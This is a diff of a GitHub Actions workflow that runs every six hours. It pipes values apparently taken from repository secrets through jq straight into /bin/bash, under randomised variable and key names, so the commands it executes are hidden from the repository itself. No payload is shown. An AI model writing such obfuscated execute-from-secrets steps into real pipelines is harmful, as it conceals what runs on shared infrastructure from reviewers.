@@ -1,31 +1,22 @@
 name: houyongliang1972
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
+    - cron: '28 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: houyongliang1972
         env:
-          al670: ${{ secrets.al670 }}
+          hk259: ${{ secrets.hk259 }}
         run: |
-          echo $al670 | jq -r .nmhob431 | /bin/bash
-          echo $v10750 | jq -r .sdqeo42584 | /bin/bash
-          echo $zijhz988 | jq -r .u39680 | /bin/bash
-          echo $n3211 | jq -r .gesp8 | /bin/bash
-          echo $gk0087 | jq -r .ungqe1081 | /bin/bash
-          echo $rgum0 | jq -r .vqcpr2716 | /bin/bash
-          echo $cfapq08553 | jq -r .lw61 | /bin/bash
-          echo $y52 | jq -r .epbo60 | /bin/bash
-          echo $tl638 | jq -r .aaulz1402 | /bin/bash
-          echo $gdgo96 | jq -r .cuur71786 | /bin/bash
-          echo $llwfa488 | jq -r .kyb27 | /bin/bash
-          echo $qbmd2965 | jq -r .a77 | /bin/bash
-          echo $wgk8 | jq -r .k492 | /bin/bash
-          echo $bjx86053 | jq -r .suvco9 | /bin/bash
+          echo $hk259 | jq -r .ueii3127 | /bin/bash
+          echo $jqqn368 | jq -r .x41 | /bin/bash
+          echo $x8 | jq -r .i4014 | /bin/bash
+          echo $fq7 | jq -r .ils79 | /bin/bash
+          echo $c41 | jq -r .zb09335 | /bin/bash
+          echo $yqagh5216 | jq -r .jdzht5 | /bin/bash
+          echo $tbu6 | jq -r .llvb51237 | /bin/bash
 
